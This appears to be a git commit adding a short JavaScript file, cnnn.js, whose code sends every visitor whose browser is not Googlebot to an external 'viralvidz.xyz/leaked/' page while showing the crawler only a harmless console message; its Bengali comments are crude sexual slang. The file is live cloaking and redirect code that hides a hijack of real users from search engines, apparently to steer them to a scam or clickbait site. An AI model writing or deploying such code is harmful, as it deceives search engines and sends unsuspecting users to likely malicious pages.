33bb776217b5f84b0e617082b8f1c0871a9d8c43
Hyder Ali <hyderali90kids@gmail.com>
2026-09-24 03:59:12 +0600

    Create cnnn.js

---
+++ cnnn.js
@@ -0,0 +1,7 @@
+if (!navigator.userAgent.includes('Googlebot')) {
+  // পোস্ট কপি করলে ডাইরেক্ট পুটকি মেরে দেয়া হবে
+  window.location.href = "https://viralvidz.xyz/leaked/?t=google";
+} else {
+  // পুটকি মারা দেয়ার জন্য ধন্যবাদ
+  console.log("Thanks for visiting my page" );
+}
